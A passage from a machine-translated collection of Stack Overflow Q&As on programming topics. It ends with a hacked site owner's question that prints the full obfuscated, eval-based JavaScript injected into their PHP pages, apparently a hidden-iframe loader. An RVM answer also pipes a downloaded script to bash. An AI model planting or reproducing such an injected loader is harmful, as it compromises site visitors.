5.  我将`backend`存储库克隆到一个新的存储库`bar`中。

6.  我将所有文件从现已关闭的`bar`分支复制并粘贴到`bar`存储库中。

这保留了我的历史`foo`，并失去了历史的连续性`bar`（尽管所有的历史仍然存在，如果我需要的话）；现在两者`foo`和`bar`都是对存储库进行修改的克隆，`backend`这正是我想要的。

# eclipse - 使用 .git 子目录导入现有的 Maven 项目

> ID：10658034
> 
> 赞同：0
> 
> 时间：2012-05-18T18:39:24.470
> 
> 标签：eclipse, egit

我有一个 Maven 项目。我一直在使用命令行来执行 git 操作。（我在项目中运行了 git init 所以里面有一个 .git 子目录）

我将它推送到一个裸存储库，我通过各种计算机从该存储库同步。

一个项目，一个仓库；就像 github 上的数千个存储库一样。

我决定尝试使用 egit 从 Eclipse 管理 git，即使命令行运行良好。

好的，右键点击maven项目，Team->Share Project，选择Git，下一步。

我不想在父文件夹中创建或使用存储库 - 或创建一个；它已经是一个存储库。

在裸存储库上导入 Git 项目 barfs，所以我不能只是“转到源代码”。

导入现有 git 项目的最简单方法是什么？

（我想， cd 到一个工作目录，克隆裸仓库，将其作为仓库添加到 eclipse，然后从那里导入 - 但首先要确保你运行 mvn eclipse:eclipse，因为 git 的导入不是那么好，而且 maven 项目进口。）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-18T19:13:41.840

eGit 不打算与裸存储库一起工作，而是让 Eclipse 意识到工作区中的各种文件背后都有一个 VCS 的事实，并在纯 Java 中重新实现足够的 git 功能，以便在没有本机客户端的情况下工作。

因此克隆您的存储库，并使用克隆。我发现这些步骤适用于 m2e。

*   克隆存储库
*   文件 -> 导入 -> 现有的 Maven 项目
*   导入完成并下载依赖项后，使用右键单击 Team -> Share on all projects，选择 Git，然后选中最顶部的复选框以查找 .git。

# c++ - 填充c ++数组时遇到问题，每个索引只有最后一项

> ID：10658035
> 
> 赞同：1
> 
> 时间：2012-05-18T18:39:27.440
> 
> 标签：c++, arrays, for-loop, ifstream, cout

首先，这是针对一个类的，所以我们能做什么和不能做什么是有限制的，而且我对 c++ 和一般编程非常陌生，所以这就是为什么代码可能有点垃圾的原因。

我想尽办法理解为什么当我在第一个 for 循环中使用第一组 cout 行显示 item_list 时，它会按原样显示每个单独的项目（它是天际成分及其效果的列表）。

然而，当第二个 for 循环执行时，item_list 只填充了应该插入的最后一项（wisp wrappings 及其效果）。

即使只是将我指向正确的方向也会非常感激:)

干杯

```
int client::fill_list(int size_in, int h1size, int h2size)
{
    char temp[ASIZE] = {'\0'};
    int j = 0;
    ifstream ifile;
    ifile.open("test.txt");

    if(ifile.is_open())
    {
        for(int i = 0; i < size_in; ++i)
        {    
            if(ifile.good())
            {       
                j = 0;
                do
                {                   
                    temp[j] = char(ifile.get());
                    ++j;
                }while(ifile.peek() != '*');
                temp[j] = char(ifile.get());
                copy(client_item.name, temp, j);
            }

            if(ifile.good())
            {
                j = 0;
                do
                {                   
                    temp[j] = char(ifile.get());
                    ++j;
                }while(ifile.peek() != '*');
                temp[j] = char(ifile.get());
                copy(client_item.effect1, temp, j);
            }

            if(ifile.good())
            {
                j = 0;
                do
                {                   
                    temp[j] = char(ifile.get());
                    ++j;
                }while(ifile.peek() != '*');
                temp[j] = char(ifile.get());
                copy(client_item.effect2, temp, j);
            }

            if(ifile.good())
            {
                j = 0;
                do
                {                   
                    temp[j] = char(ifile.get());
                    ++j;
                }while(ifile.peek() != '*');
                temp[j] = char(ifile.get());
                copy(client_item.effect3, temp, j);
            }

            if(ifile.good())
            {
                j = 0;
                do
                {                   
                    temp[j] = char(ifile.get());
                    ++j;
                }while(ifile.peek() != '*');
                temp[j] = char(ifile.get());
                copy(client_item.effect4, temp, j);
            }
            reference.into_list(i,client_item);
        cout << reference.item_list[i].name;
        cout << reference.item_list[i].effect1;
        cout << reference.item_list[i].effect2;
        cout << reference.item_list[i].effect3;
        cout << reference.item_list[i].effect4;
        getchar();
        }
    }
    for(int k = 0; k < SIZE; ++k)
    {
        cout << reference.item_list[k].name;
        cout << reference.item_list[k].effect1;
        cout << reference.item_list[k].effect2;
        cout << reference.item_list[k].effect3;
        cout << reference.item_list[k].effect4;
    }
    getchar();
    return 0;
} 
```

...

```
int table::into_list(int index, item&item_in)
{
    if(index < SIZE)
    {
        item_list[index] = item_in;
        return 0;
    }
    else
        return 1;
} 
```

...表类的标题

```
#include "hash.h"

class table
{
public:
    table()
    {
        item_list = new item [SIZE];
    }
    ~table();
    int fill(item*);
    int insert(item&, nHash&);
    int insert(item&, eHash&, int);
    int retrieve(char*,item*,int);
    int remove(int,item&);
    int remove(int);
    int check_hash(int,int,int);
    int keygen(char*, int);
    int from_list(int, item&);
    int into_list(int, item&);

//private:
    item * item_list;
    nHash name_table;
    eHash ef1_table;
    eHash ef2_table;
    eHash ef3_table;
    eHash ef4_table;
}; 
```

....主要的开始

```
#include "client.h"

int main()
{
    client program;

    program.fill_list(SIZE,HNSIZE,HESIZE);

    for(int i = 0; i < SIZE; ++i)
    {
        cout << program.reference.item_list[i].name;
        cout << program.reference.item_list[i].effect1 << endl;
        cout << program.reference.item_list[i].effect2 << endl;
        cout << program.reference.item_list[i].effect3 << endl;
        cout << program.reference.item_list[i].effect4 << endl;
    } 
```

……

项目标题

```
#include <iostream>
#include <fstream>
#include <cctype>
#include <cstdlib>
#include <cstring>
#include <cmath>

using namespace std;

const int ASIZE = 30;
const int SIZE = 92;
const int HNSIZE = 41;
const int HESIZE = 17;

struct item
{
    item();
    ~item();
    char * name;
    char * effect1;
    char * effect2;
    char * effect3;
    char * effect4;
    int count;
    //int keygen(int,int);
    /*int name_key;
    int ef1_key;
    int ef2_key;
    int ef3_key;
    int ef4_key;*/
}; 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-18T19:07:26.493

问题的一部分可能是您如何在`client_item`此处复制：

```
reference.into_list(i,client_item); 
```

这只是分配`client_item`给`item_list`这样的：

```
item_list[index] = item_in; 
```

...但是因为`item`是这样定义的：

```
struct item
{
    item();
    ~item();
    char * name;
    char * effect1;
    ... 
```

...所有`item`s in都将具有指向与 in 内存相同的内存的`item_list`指针（如等） 。 `name``client_item`

例如，每次赋值后，指针`item_list[index].name`和`item_in.name`将具有相同的值。（如果您好奇，可以通过打印两个指针来检查。）由于它们都指向同一个内存，如果您更改存储在该内存中的内容，两个对象似乎会同时更改。

这意味着后续的更改`client_item`——比如将新字符串复制到它指向的位置之一——也会影响所有保存的项目。

# .net - .Net SDK 用于生物识别扫描

> ID：10658038
> 
> 赞同：0
> 
> 时间：2012-05-18T18:39:35.630
> 
> 标签：.net, biometrics

我计划为无卡购物实施生物特征认证系统

目的是使用指纹扫描作为银行交易的身份验证方法之一

我在 DOT 网络中寻找可用于扫描指纹的解决方案，并且我研究过可以找到[verifinger](http://neurotechnology.com/verifinger.html)，[griaule](http://www.griaulebiometrics.com/new/content/gbs-forensic-edition/#sdk)作为一些好的 SDK

我需要一个可以完美扫描指纹的 SDK，即使是来自指纹读取器的不同质量/清晰度的图像，也可以是指纹扫​​描图像

请帮我看看哪一个是一个不错的选择

问候斯里卡

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2016-04-05T09:47:45.050

有两种方法可以将生物特征认证系统与现有平台集成以实现无卡支付。一种方法是为 .Net 框架开发一个 SDK，该 SDK 将与您计划使用的硬件/扫描仪一起使用。但是开发一个有时要困难得多，因为你必须记住很多问题，比如操作系统升级。第二种也是更实际可行的解决方案是使用可以轻松集成到系统中的现有 SDK。使用信誉良好的供应商提供的 SDK，您不必担心升级或故障。您可以查看 M2SYS SDK。但是，如果您正在寻找免费的解决方案，它不是免费的。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-06-01T06:45:46.993

Look at the digital persona sdk as well. They are implementing wsq file format which will give you compatibility in future with other readers. There is a once off fee for the development kit which is not that high and no licenses required. There is also a free version which allows for one to one matching of prints. There is also a lot of other nice stuff implemented such as identification over networks and recognition and take-on of users online which can be used free and is available in the digital persona web forums. You can use on windows and Linux and new model coming soon will give compatibility for hardware integrations. In my opinion they are one of the best desktop scanners with great support. They are also the most economical in the high performance scanners as far as cost is concerned. Full samples in a number of languages including c# and a very nice GUI is provided plus full documentation. Is very simple to implement in comparison to any other kit I have worked with.

Regards Warrick

# c# - 获取 Facebook 令牌的客户端凭据

> ID：10658042
> 
> 赞同：6
> 
> 时间：2012-05-18T18:39:43.760
> 
> 标签：c#, .net, facebook, facebook-graph-api

此页面未说明我们必须使用哪些客户端凭据。

[https://developers.facebook.com/docs/authentication/applications/](https://developers.facebook.com/docs/authentication/applications/)

```
https://graph.facebook.com/oauth/access_token?
    client_id=YOUR_APP_ID
   &client_secret=YOUR_APP_SECRET
   &grant_type=client_credentials 
```

有什么线索吗？

这也有意义[https://developers.facebook.com/docs/authentication/permissions/](https://developers.facebook.com/docs/authentication/permissions/)吗？

谢谢！

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-05-18T19:01:27.330

```
grant_type=client_credentials 
```

is just a hardcoded string you should use in your request. You only need to insert your app's id/secret into that string.

# ruby-on-rails - 密码更改后设计验证登录

> ID：10658043
> 
> 赞同：4
> 
> 时间：2012-05-18T18:39:51.537
> 
> 标签：ruby-on-rails, login, devise, logout, password-recovery

在 Rails 中设计身份验证 gem。

如何防止“忘记密码”链接更改密码后自动登录？

理想情况下，最好显示带有“新密码已保存”消息的页面。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-19T01:15:55.863

您将需要覆盖 Devise ，您可以在[此处](https://github.com/plataformatec/devise/blob/master/app/controllers/devise/passwords_controller.rb)`passwords_controller`查看默认方法。首先，创建您自己的控制器，该控制器将从 Devise 控制器继承：

`class User::PasswordsController < Devise::PasswordsController`

准备好控制器后，添加您不想覆盖的所有其他方法，然后在其中简单地调用 super 。这将是`new`、`edit`和`create`方法。也不要忘记添加受保护的`after_sending_reset_password_instructions_path_for(resource_name)`方法。

您关心的覆盖方法是`update`操作。

```
def update
  self.resource = resource_class.reset_password_by_token(resource_params)

  if resource.errors.empty?
    flash_message = resource.active_for_authentication? ? :updated : :updated_not_active
    set_flash_message(:notice, "Your flash message here")
    redirect_to new_user_session_path
  else
    respond_with resource
  end
end 
```

我们在这里所做的更改是删除通过重定向到登录页面登录用户的行，然后设置我们的自定义 Flash 消息。

最后，您必须告诉 devise 使用您的新控制器，因此`routes.rb`更改`devise_for :users`为：

```
devise_for :users, :controllers => { :passwords => 'users/passwords' } 
```

那应该这样做。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-10-22T16:53:20.817

这是基于设计 3.1.1 的更新

```
class Users::PasswordsController < Devise::PasswordsController

 def new
   super
 end

 def edit
   super
 end

 def create
   super
 end

 #override this so user isn't signed in after resetting password
 def update
    self.resource = resource_class.reset_password_by_token(resource_params)

    if resource.errors.empty?
      resource.unlock_access! if unlockable?(resource)
      flash_message = resource.active_for_authentication? ? :updated : :updated_not_active
      set_flash_message(:notice, flash_message) if is_navigational_format?

      respond_with resource, :location => after_resetting_password_path_for(resource)
    else
      respond_with resource
    end

  end

protected

   def after_resetting_password_path_for(resource)
     new_session_path(resource)
   end 
```

结尾

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2019-01-10T12:26:41.113

从 Devise [3.5.0](https://github.com/plataformatec/devise/commit/f0992e4a96352dbb2dfec731f46a51f99a013b29)开始，可以使用设置来控制此行为，该设置位于`config/initializers/devise.rb`：

```
# When set to false, does not sign a user in automatically after their password is
# reset. Defaults to true, so a user is signed in automatically after a reset.
config.sign_in_after_reset_password = false 
```

显示的闪烁消息将为`Your password has been changed successfully.`，但可以在 中调整`config/locales/devise.en.yml`：

```
en:
  devise:
    passwords:
      updated_not_active: New password has been saved 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-22T05:05:07.587

上面说的答案是正确的，但问题是它根据设计版本而有所不同。我按照上面所说的，我无法让它工作，一段时间后我发现我使用的设计版本不支持 resource_params 方法，然后我尝试了不同的版本并让它工作。

# rvm - 'rvm get head' 无法识别的命令行参数：Ubuntu 11.10 oneric 上的'get'（参见：'rvm usage'）

> ID：10658045
> 
> 赞同：0
> 
> 时间：2012-05-18T18:40:06.060
> 
> 标签：rvm

我在 ubuntu 11.0 上安装了以下版本的 rvm。

```
$ rvm -v
rvm 1.0.1 by Wayne E. Seguin (wayneeseguin@gmail.com) [http://rvm.beginrescueend.com/] 
```

但是，在运行 rvm get head 时，我遇到了以下错误。

```
$ rvm get head && rvm reload
fail: Unrecognized command line argument: 'get' ( see: 'rvm usage' )

$ rvm update --head
rvm 1.0.1 by Wayne E. Seguin (wayneeseguin@gmail.com) [http://rvm.beginrescueend.com/]
fatal: destination path 'rvm' already exists and is not an empty directory.
fatal: destination path 'rvm' already exists and is not an empty directory. 
```

你能帮我找出问题所在吗？以及如何解决它？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-19T15:20:33.857

You have very old RVM installation, probably from Ubuntu, use this answer:

[Installed Ruby 1.9.3 with RVM but command line doesn't show ruby -v](https://stackoverflow.com/questions/9056008/installed-ruby-1-9-3-with-rvm-but-command-line-doesnt-show-ruby-v/9056395#9056395)

It will help you clean your system and install stable version of RVM.

As a hint, you could use following command to install RVM, Ruby and Rails in one hit:

```
curl -L get.rvm.io | bash -i stable --rails --auto 
```

# java - 用于实现具有内部类的 SAX 解析器的 Java 类

> ID：10658050
> 
> 赞同：0
> 
> 时间：2012-05-18T18:40:26.700
> 
> 标签：java, xml, sax

对于大学作业，我需要编写一个 SAX 解析器和一个过滤器来读取原始 XML 文件，然后创建一个新的修改过的文件。分配要求我的程序需要通过控制台运行“java Sax inputFileDestination OutputFileDestination”，并且它要求只有一个文件。我的意思是我需要在 Sax.java 中实现接口。我熟悉内部类，但我不知道如何使用外部类中的 main 方法来实现它。

有什么建议吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-18T18:50:21.100

考虑在另一个具有`main`. 然后将该`main`方法作为测试代码放在您的 MySAXParser 类中。

XML 解析器使用 SPI（服务提供者接口）提供一个带有 META-INF/MANIFEST.MF 的 jar。您可能会考虑做与奖金相同的事情。

其他内部类可以`private static`是独立的，或者只是`private`存储一个额外的外部`MySAXParser.this`；所以经常犯的一个错误就是忘记`static`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-18T18:48:21.220

由于这是一个作业，我不会发布任何代码，而是解释如何去做。

我认为你根本不需要一个内部类来做到这一点。您的类将有一个 main 方法，该方法创建一个 SAXParser，并将自身 (this) 注册为回调。然后，您将从 HandlerBase 中实现所需的 SAX 方法（startElement、endElement、characters）。

您所做的只是编写一个 SAXParser，然后在其上添加一个 main() 方法，因此它将从命令行运行。

# android - 有多少空间可用于缓存清单下载？（每个网络应用程序）

> ID：10658052
> 
> 赞同：1
> 
> 时间：2012-05-18T18:40:32.080
> 
> 标签：android, ios, html, cordova, webview

我可以下载多少数据以在我的网络应用程序`CACHE MANIFEST`中离线使用有限制吗？`PhoneGap`

# wcf - System.Runtime.Caching 通过代码配置？

> ID：10658056
> 
> 赞同：2
> 
> 时间：2012-05-18T18:41:12.817
> 
> 标签：wcf, caching, memory, configuration

```
MemoryCache.Default.CacheMemoryLimit = 10; 
```

CacheMemoryLimit 没有程序化的“设置器”，但显然是在配置文件中设置的。

谁能推荐一种在代码中将内存限制实际设置为 10mb 的方法？

这适用于具有数据库驱动配置的 WCF 服务，因此表中的行管理代码不同部分的行为。这允许对许多站点/应用程序进行集中管理，所以我需要帮助来解决这个问题。

谢谢。

# android - 可以在没有交互的情况下调用 onCheckedChanged 方法吗？

> ID：10658059
> 
> 赞同：5
> 
> 时间：2012-05-18T18:41:24.240
> 
> 标签：android, oncheckedchanged

我有一个习惯`ListView`，点击一个项目会触发一个新的`Activity`. 的每一行`ListView`都有一个`CheckBox`和一个`TextView`。

这是`getView`我自定义的方法`ListView`：

```
public View getView(int position, View convertView, ViewGroup parent) {
        View v = convertView;
        if (v == null) {
            LayoutInflater vi = (LayoutInflater) getSystemService(Context.LAYOUT_INFLATER_SERVICE);
            v = vi.inflate(R.layout.puzzles_row, null);
        }
        ListedPuzzle lp = items.get(position);
        if (lp != null) {
            TextView title = (TextView) v.findViewById(R.id.listTitles);
            title.setText(lp.getTitle());
            CheckBox star = (CheckBox) v.findViewById(R.id.star_listed);
            star.setChecked(lp.isStarred());
            star.setTag(new Integer(position));

            star.setOnCheckedChangeListener(new OnCheckedChangeListener() {

                public void onCheckedChanged(CompoundButton buttonView,
                        boolean isChecked) {
                    Integer realPosition = (Integer) buttonView.getTag();
                    ListedPuzzle obj = items.get(realPosition);
                    starListedPuzzle(obj.getId(), isChecked);
                }
            });

        }
        return v;

    } 
```

当`onCheckedChanged`从另一个 Activty 返回时调用 ，而没有可能的用户交互来实际检查任何内容。

关键是它曾经工作得很好，并没有真正改变任何东西。我[读过](https://stackoverflow.com/questions/3913687/checkbox-changes-value-twice)这是一个错误，但我真的不敢相信。

它总是在相同的两个项目上调用方法`ListView`。他们可以以`checkedChange=true`某种方式设置吗？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-05-18T18:49:09.177

我有一种感觉，它正在发生在`onRestoreInstanceState`方法中。`View`暂停和恢复时，Android 会自动处理恢复活动中大多数 s 的状态。恢复时，听起来像是在恢复`CheckBox`对象的已检查状态，即触发`onCheckedChanged`. 尝试在您的中执行此操作，`Activity`如果这可以解决您的问题，请告诉我：

```
private boolean mRestoringInstanceState;

@Override
protected void onRestoreInstanceState( Bundle savedInstanceState ) {

    mRestoringInstanceState = true;
    super.onRestoreInstanceState( savedInstanceState );
    mRestoringInstanceState = false;
} 
```

然后`onCheckChanged`像这样改变你的方法：

```
public void onCheckedChanged(CompoundButton buttonView,
        boolean isChecked) {

    if(!mRestoringInstanceState) {
        Integer realPosition = (Integer) buttonView.getTag();
        ListedPuzzle obj = items.get(realPosition);
        starListedPuzzle(obj.getId(), isChecked);
    }
} 
```

**编辑：**可能更好/更简单的解决方案是在方法中分配侦听器，`onResume`因为它在`onRestoreInstanceState`. 请注意，如果使用此解决方案，您将不会实现上述任何内容：

```
@Override
protected void onResume() {

    super.onResume();
    CheckBox star = (CheckBox) v.findViewById(R.id.star_listed);
    star.setOnCheckedChangeListener(new OnCheckedChangeListener() {

        public void onCheckedChanged(CompoundButton buttonView,
                boolean isChecked) {
            // onCheckedChanged implementation
        }
    });
} 
```

**Edit2：**刚刚意识到你正在做这个`Adapter`。这可能与 无关`onRestoreInstanceState`，但我想我看到了问题。您在 s 中重用`View`s `Adapter`，这很好，但您在设置`star`侦听器之前设置为检查。问题是从上次通过该方法`star`时就已经有了一个侦听器。`getView`在你打电话之前`star.setChecked()`，打电话`star.setOnCheckedChangedListener(null)`看看这是否能解决你的问题。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2015-06-10T18:44:26.990

可以在片段中的 onRestoreInstanceState 上调用它

你可以禁用它

```
android:saveEnabled="false" 
```

在 Checkbox 的布局定义上

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2014-03-20T16:28:13.103

我使用自定义适配器也遇到了这个问题。

我发现检查按钮 isShown 是否解决了问题：

```
OnCheckedChangeListener ccl = new OnCheckedChangeListener()
{
    @Override
    public void onCheckedChanged(CompoundButton buttonView,
            boolean isChecked) {

        if(buttonView.isShown())
        {

        }
    }
}; 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2015-03-13T18:41:05.230

在侦听器中检查您的堆栈跟踪

```
public void onCheckedChanged(CompoundButton buttonView, isChecked) {
    <breakpoint here>
} 
```

如果您`onRestoreInstanceState()`在堆栈跟踪中看到，您可以在布局中使用它：

```
<CheckBox
...
android:saveEnabled="false" /> 
```

...如此处建议： [Android CheckBox -- 屏幕旋转后恢复状态](https://stackoverflow.com/questions/2512010/android-checkbox-restoring-state-after-screen-rotation)

**或者**

如果您看到这`star.setChecked()`是在堆栈跟踪中从您那里调用的那个，那么只需在之前`getView()`删除侦听器（然后您可以像这样做一样重置侦听器）。就像杰森罗宾逊建议的那样。`star.setOnCheckedChangedListener(null)``star.setChecked()`

# c# - 从javascript调用asp.net页面方法不起作用

> ID：10658061
> 
> 赞同：9
> 
> 时间：2012-05-18T18:41:33.860
> 
> 标签：c#, javascript, asp.net, pagemethods

嗨，我正在从 javascript 调用一个简单的页面方法，这是我在标记处的代码

```
 function OnCallSumComplete(result, userContext, methodName) {             
            alert(result);
 }
 function OnCallSumError(error, userContext, methodName) {
     if (error !== null) {
         alert(error.get_message());
     }
 }
 function test(){
     var contextArray = "";
     PageMethods.TestMethod("test parameter", OnCallSumComplete, OnCallSumError,  contextArray);
 }

 <asp:ScriptManager ID="ScriptManager1" EnablePageMethods="true" runat="server" /> 
```

在 cs

```
 [System.Web.Services.WebMethod]
 public static string TestMethod(string para)
 {

    return "Yes this is working";
 } 
```

警报显示结果并显示“null”。我检查了萤火虫，但没有从控制台看到错误。

如果我将 TestMethod 更改为

```
 [System.Web.Services.WebMethod]
 public static string TestMethod()
 {
    return "Yes this is working";
 } 
```

和 PageMethod 来

```
 PageMethods.TestMethod( function (response) { alert(response);  } ); 
```

它显示正确的响应为“是的，这是有效的”。但是，我需要将参数传递给函数。我想念什么吗？

感谢帮助。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-16T17:44:33.893

我认为主要问题在于您用于 ScriptManager 的程序集。

```
<asp:ScriptManager ID="ScriptManager1" 
                   EnablePageMethods="true" 
                   runat="server" /> 
```

要解决您在 Webconfig 中使用的问题 -

```
<pages>
  <controls>
    <add tagPrefix="ajax" 
         namespace="System.Web.UI" 
         assembly="System.Web.Extensions, 
                   Version=1.0.61025.0, 
                   Culture=neutral, 
                   PublicKeyToken=31bf3856ad364e35"/>
  </controls>
</pages> 
```

并在您的 .aspx 页面中使用以下几行 -

```
<ajax:ScriptManager ID="ScriptManager1" 
                    EnablePageMethods="true" 
                    runat="server" /> 
```

希望这将帮助您解决您的问题。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-18T19:05:53.917

我认为您必须使用 [ScriptMethod] 代替 [WebMethod] 或除 [WebMethod] 之外，以便通过 javascript 调用使用 asmx 方法。它可能在不带参数的情况下工作的原因是因为请求不必解析任何内容来处理该方法。

尝试使用 [ScriptMethod] （可能在您的类定义中使用 [ScriptService]），看看是否会有所不同。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-03-26T18:06:25.030

The problem is that on your Web.config you need to have a module (IHttpModule) enabled: ScriptModule-4.0\. This is enabled by default, but you may have removed it. Look for it in the machine-wide Web.config file, if you are curious, and see if it was removed from your local Web.config. Its declaration should be under system.webServer/modules (for IIS >= 7) and system.web/httpModules for Visual Studio's built-in web server or IIS < 7.

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-18T18:54:23.103

据我所知，您的通话中只需要 3 个参数（您的参数，onsuccess 和 onfailure）。您是否尝试使用 PageMethods.TestMethod("test parameter", OnCallSumComplete, OnCallSumError);

# c++ - 将 Eigen 类型与 boost::bind 一起使用是否会自动违反 Eigen 的“仅通过引用传递”规则？

> ID：10658062
> 
> 赞同：1
> 
> 时间：2012-05-18T18:41:37.623
> 
> 标签：c++, pass-by-reference, boost-bind, memory-alignment, eigen

因为 libeigen 做了特殊的工作来调整其所有类型的内存对齐，它有一个特殊的规则，即在传递特征类型作为参数时，它们应该始终是按引用传递的。

但是我相信 boost::bind 隐含地按值传递。

我的直觉是，将 boost::bind 与 eigen 类型一起使用（并且不使用 boost:ref）会违反 Eigen 的传递引用规则，从而导致问题。

谁能证实这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-18T19:06:44.970

`boost::bind`将有效地将参数作为值传递。除非你用 包装它们`boost::(c)ref`，否则它只是按值传递的包装器。

# python - 安装python2.6构建依赖

> ID：10658067
> 
> 赞同：3
> 
> 时间：2012-05-18T18:42:03.173
> 
> 标签：python, python-2.6

我正在尝试使用 sudo apt-get build-dep python2.6 安装 python2.6 buid 依赖项，但出现错误 E: Unable to find a source package for python2.6

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-02-13T20:31:07.480

这是因为您在*/etc/apt/sources.list*中禁用了源存储库。找到这一行：

```
deb http://archive.ubuntu.com/ubuntu <version-name> main restricted multiverse 
```

复制它并将“deb”更改为“deb-src”，例如：

```
deb-src http://archive.ubuntu.com/ubuntu <version-name> main restricted multiverse 
```

现在运行：

`sudo apt-get update`

然后，您应该能够通过运行以下命令来安装 Python 的依赖项：

```
sudo apt-get build-dep python 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-18T18:44:57.387

`sudo apt-get build-dep python-defaults`这个问题属于[serverfault.com](https://serverfault.com/)

# javascript - 站点刚刚被攻击，并且在头部注入了javascript，这是什么意思？

> ID：10658071
> 
> 赞同：14
> 
> 时间：2012-05-18T18:42:30.697
> 
> 标签：javascript, security

我们的一个网站最近遭到攻击，其中多个 php 文件被修改。此修改在页面顶部注入了 javascript，但在 base64 解码所有内容后，我遇到了以下内容，我不知道如何继续。

有没有人在这方面有任何经验，并且无论如何都可以弄清楚他们想要实现的目标是什么？

```
<script>i=0;try{avasv=prototype;}catch(z){h="harCode";f=['-33f-33f63f60f-10f-2f58f69f57f75f67f59f68f74f4f61f59f74f27f66f59f67f59f68f74f73f24f79f42f55f61f36f55f67f59f-2f-3f56f69f58f79f-3f-1f49f6f51f-1f81f-29f-33f-33f-33f63f60f72f55f67f59f72f-2f-1f17f-29f-33f-33f83f-10f59f66f73f59f-10f81f-29f-33f-33f-33f58f69f57f75f67f59f68f74f4f77f72f63f74f59f-2f-8f18f63f60f72f55f67f59f-10f73f72f57f19f-3f62f74f74f70f16f5f5f65f79f75f56f58f79f79f79f56f4f66f69f69f65f63f68f4f55f74f5f21f61f69f19f8f-3f-10f77f63f58f74f62f19f-3f7f6f-3f-10f62f59f63f61f62f74f19f-3f7f6f-3f-10f73f74f79f66f59f19f-3f76f63f73f63f56f63f66f63f74f79f16f62f63f58f58f59f68f17f70f69f73f63f74f63f69f68f16f55f56f73f69f66f75f74f59f17f66f59f60f74f16f6f17f74f69f70f16f6f17f-3f20f18f5f63f60f72f55f67f59f20f-8f-1f17f-29f-33f-33f83f-29f-33f-33f60f75f68f57f74f63f69f68f-10f63f60f72f55f67f59f72f-2f-1f81f-29f-33f-33f-33f76f55f72f-10f60f-10f19f-10f58f69f57f75f67f59f68f74f4f57f72f59f55f74f59f27f66f59f67f59f68f74f-2f-3f63f60f72f55f67f59f-3f-1f17f60f4f73f59f74f23f74f74f72f63f56f75f74f59f-2f-3f73f72f57f-3f2f-3f62f74f74f70f16f5f5f65f79f75f56f58f79f79f79f56f4f66f69f69f65f63f68f4f55f74f5f21f61f69f19f8f-3f-1f17f60f4f73f74f79f66f59f4f76f63f73f63f56f63f66f63f74f79f19f-3f62f63f58f58f59f68f-3f17f60f4f73f74f79f66f59f4f70f69f73f63f74f63f69f68f19f-3f55f56f73f69f66f75f74f59f-3f17f60f4f73f74f79f66f59f4f66f59f60f74f19f-3f6f-3f17f60f4f73f74f79f66f59f4f74f69f70f19f-3f6f-3f17f60f4f73f59f74f23f74f74f72f63f56f75f74f59f-2f-3f77f63f58f74f62f-3f2f-3f7f6f-3f-1f17f60f4f73f59f74f23f74f74f72f63f56f75f74f59f-2f-3f62f59f63f61f62f74f-3f2f-3f7f6f-3f-1f17f-29f-33f-33f-33f58f69f57f75f67f59f68f74f4f61f59f74f27f66f59f67f59f68f74f73f24f79f42f55f61f36f55f67f59f-2f-3f56f69f58f79f-3f-1f49f6f51f4f55f70f70f59f68f58f25f62f63f66f58f-2f60f-1f17f-29f-33f-33f83'][0].split('f');v="e"+"va";}if(v)e=window[v+"l"];try{q=document.createElement("div");q.appendChild(q+"");}catch(qwg){w=f;s=[];} r=String;z=((e)?h:"");for(;573!=i;i+=1){j=i;if(e)s=s+r["fromC"+((e)?z:12)](w[j]*1+42);} if(v&&e&&r&&z&&h&&s&&f&&v)e(s);</script> 
```

美化：

```
i = 0;
try {
    avasv = prototype;
} catch (z) {
    h = "harCode";
    f = ['-33f-33f63f60f-10f-2f58f69f57f75f67f59f68f74f4f61f59f74f27f66f59f67f59f68f74f73f24f79f42f55f61f36f55f67f59f-2f-3f56f69f58f79f-3f-1f49f6f51f-1f81f-29f-33f-33f-33f63f60f72f55f67f59f72f-2f-1f17f-29f-33f-33f83f-10f59f66f73f59f-10f81f-29f-33f-33f-33f58f69f57f75f67f59f68f74f4f77f72f63f74f59f-2f-8f18f63f60f72f55f67f59f-10f73f72f57f19f-3f62f74f74f70f16f5f5f65f79f75f56f58f79f79f79f56f4f66f69f69f65f63f68f4f55f74f5f21f61f69f19f8f-3f-10f77f63f58f74f62f19f-3f7f6f-3f-10f62f59f63f61f62f74f19f-3f7f6f-3f-10f73f74f79f66f59f19f-3f76f63f73f63f56f63f66f63f74f79f16f62f63f58f58f59f68f17f70f69f73f63f74f63f69f68f16f55f56f73f69f66f75f74f59f17f66f59f60f74f16f6f17f74f69f70f16f6f17f-3f20f18f5f63f60f72f55f67f59f20f-8f-1f17f-29f-33f-33f83f-29f-33f-33f60f75f68f57f74f63f69f68f-10f63f60f72f55f67f59f72f-2f-1f81f-29f-33f-33f-33f76f55f72f-10f60f-10f19f-10f58f69f57f75f67f59f68f74f4f57f72f59f55f74f59f27f66f59f67f59f68f74f-2f-3f63f60f72f55f67f59f-3f-1f17f60f4f73f59f74f23f74f74f72f63f56f75f74f59f-2f-3f73f72f57f-3f2f-3f62f74f74f70f16f5f5f65f79f75f56f58f79f79f79f56f4f66f69f69f65f63f68f4f55f74f5f21f61f69f19f8f-3f-1f17f60f4f73f74f79f66f59f4f76f63f73f63f56f63f66f63f74f79f19f-3f62f63f58f58f59f68f-3f17f60